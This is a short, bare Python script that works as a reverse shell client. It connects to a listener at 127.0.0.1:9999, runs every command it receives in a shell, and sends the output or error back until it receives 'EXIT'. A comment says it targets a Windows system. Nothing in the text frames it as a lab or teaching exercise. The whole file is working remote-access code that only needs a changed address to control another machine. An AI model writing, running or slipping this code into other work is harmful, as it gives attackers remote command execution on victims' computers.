import socket
import subprocess

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(('127.0.0.1', 9999))

while True:
    command = client.recv(4096).decode()
    
    if command.upper() == "EXIT":
        break
        
    # Execute the command on the Windows system and capture the output
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        if not output:
            client.send("Command executed successfully with no output.".encode())
        else:
            client.send(output)
    except Exception as e:
        # If the command is wrong or fails, send the error message back
        client.send(f"Execution Error: {str(e)}".encode())

client.close()
